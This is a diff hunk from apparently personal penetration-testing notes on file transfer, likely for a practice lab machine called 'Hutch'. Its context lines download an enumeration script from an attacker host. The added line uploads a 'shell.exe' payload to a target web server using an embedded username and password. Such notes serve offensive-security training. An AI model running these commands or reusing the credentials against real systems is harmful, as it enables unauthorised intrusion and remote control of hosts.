@@ -11,6 +11,7 @@ wget http://10.10.14.1:8000/linenum.sh # on target machine
 
 ```bash
 curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
+curl -T '/home/kali/Documents/pg/Hutch/shell.exe' 'http://192.168.136.122/' -u fmcsorley:CrabSharkJellyfish192
 ```
 
 ## SCP
